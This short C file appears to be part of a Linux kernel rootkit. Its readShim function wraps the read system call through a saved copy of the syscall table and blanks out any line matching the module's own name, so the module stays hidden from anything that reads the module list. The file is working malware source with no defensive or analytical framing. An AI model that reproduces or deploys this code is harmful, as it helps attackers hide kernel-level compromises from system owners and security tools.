#include "include.h"
#include "rw.h"
#include "syscall.h"
#include "utility.h"
#include "secrets.h"
MODULE_LICENSE("GPL");


int readShim(int fd, char* buf, int BUF_SIZE) {
	int nread;
	char* secretpos;
	nread = ((SYS_read_type)backup_sys_call_table[SYS_read])(fd, buf, BUF_SIZE);
	if (nread <= 27) {
		return nread;
	}
	secretpos = 0;
	secretpos = strnstrn(buf, nread, secret_ko_name_line, 27);
	if (secretpos) {
		memcpy(secretpos, "                           ", 27);
	}
	return nread;
}
